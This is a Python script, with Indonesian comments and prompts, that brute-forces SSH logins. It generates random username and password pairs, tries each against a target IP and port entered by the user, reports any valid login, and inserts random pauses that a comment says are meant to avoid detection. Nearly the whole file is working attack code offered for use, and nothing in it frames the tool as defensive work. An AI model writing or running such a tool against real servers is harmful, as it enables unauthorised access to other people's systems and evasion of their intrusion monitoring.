import paramiko
import socket
import time
import random
import string

def generate_random_string(length):
    """Generate a random string of fixed length."""
    letters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(letters) for i in range(length))

def generate_random_credentials(num_credentials):
    """Generate a list of random username and password pairs."""
    credentials = []
    for _ in range(num_credentials):
        username = generate_random_string(random.randint(5, 10))  # Username dengan panjang 5-10 karakter
        password = generate_random_string(random.randint(8, 15))  # Password dengan panjang 8-15 karakter
        credentials.append((username, password))
    return credentials

def ssh_bruteforce(target_ip, port, credentials):
    for username, password in credentials:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print(f"Trying {username}:{password}")
            client.connect(
                target_ip,
                port=port,
                username=username,
                password=password,
                timeout=5,
                banner_timeout=200
            )
            print(f"\n[!] Success! Valid credentials: {username}:{password}")
            return
        except paramiko.AuthenticationException:
            print("Authentication failed")
        except socket.error as e:
            print(f"Connection error: {str(e)}")
            break
        except Exception as e:
            print(f"Error: {str(e)}")
            break
        finally:
            client.close()
            time.sleep(random.uniform(1, 3))  # Jeda acak untuk hindari deteksi

    print(f"\n[!] Reached maximum attempts ({len(credentials)}). Stopping.")

def main():
    print("=== Bruteforce Tester (Improved) ===")
    target_ip = input("Masukkan IP target: ")
    port = int(input("Masukkan port target (contoh: 22 untuk SSH): "))
    num_credentials = int(input("Masukkan jumlah kombinasi username dan password yang ingin di-generate: "))

    # Generate random credentials sesuai jumlah yang dimasukkan
    credentials = generate_random_credentials(num_credentials)
    random.shuffle(credentials)  # Acak urutan percobaan

    print("\n[+] Starting randomized bruteforce attack...")
    ssh_bruteforce(target_ip, port, credentials)

if __name__ == "__main__":
    main()